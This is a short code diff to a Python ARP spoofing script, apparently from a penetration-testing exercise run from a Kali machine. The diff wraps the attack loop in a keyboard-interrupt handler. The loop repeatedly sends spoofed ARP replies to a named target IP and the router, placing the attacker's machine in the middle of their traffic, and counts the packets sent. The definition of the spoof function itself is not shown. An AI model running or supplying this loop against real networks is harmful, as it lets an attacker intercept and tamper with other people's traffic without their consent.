@@ -21,10 +21,12 @@ def spoof(target_ip, spoof_ip):
 
 sent_packages_count = 0
 
-
-while True:
-    spoof("192.168.2.79", "192.168.1.1")  # target ip and router ip
-    spoof("192.168.1.1", "192.168.2.75")  # router ip and kali ip
-    sent_packages_count = sent_packages_count + 2
-    print("\r[+] Two packages sent: " + str(sent_packages_count), end="")
-    time.sleep(2)
+try:
+    while True:
+        spoof("192.168.2.79", "192.168.1.1")  # target ip and router ip
+        spoof("192.168.1.1", "192.168.2.75")  # router ip and kali ip
+        sent_packages_count = sent_packages_count + 2
+        print("\r[+] Two packages sent: " + str(sent_packages_count), end="")
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("[+] Detected CTRL + C ... Quitting.")
